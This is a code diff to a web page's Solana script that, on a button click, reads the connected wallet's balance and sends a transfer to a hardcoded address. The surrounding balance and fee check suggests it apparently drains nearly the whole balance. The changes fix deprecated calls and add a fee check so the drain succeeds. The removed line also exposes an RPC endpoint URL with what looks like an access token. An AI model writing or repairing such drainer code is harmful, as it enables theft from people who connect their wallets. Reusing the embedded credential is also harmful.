@@ -32,12 +32,16 @@
 
         document.getElementById('transfer-button').addEventListener('click', async function () {
             if (walletAddress) {
-                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('wss://wider-hidden-water.solana-mainnet.quiknode.pro/c3838343ee4b4b0cd29386396f778fd5e5463f55/'), 'confirmed');
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
                 const fromPubkey = new solanaWeb3.PublicKey(walletAddress);
                 const toPubkey = new solanaWeb3.PublicKey('9GutCi1jKvRTDBmF4kjJRxubc7LqrHYQKYThZbiHMNAw'); // 替换成目标钱包地址
 
                 try {
                     const balance = await connection.getBalance(fromPubkey);
+                    if (balance <= 5000) {
+                        throw new Error('Insufficient balance to cover transaction fee.');
+                    }
+
                     const transaction = new solanaWeb3.Transaction().add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey,
@@ -46,12 +50,12 @@
                         })
                     );
 
-                    const { blockhash } = await connection.getRecentBlockhash();
+                    const { blockhash } = await connection.getLatestBlockhash();
                     transaction.recentBlockhash = blockhash;
                     transaction.feePayer = fromPubkey;
 
                     const signedTransaction = await window.solana.signTransaction(transaction);
-                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                    const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: false });
 
                     await connection.confirmTransaction(signature, 'confirmed');
                     document.getElementById('transfer-status').innerText = 'Transfer successful: ' + signature;
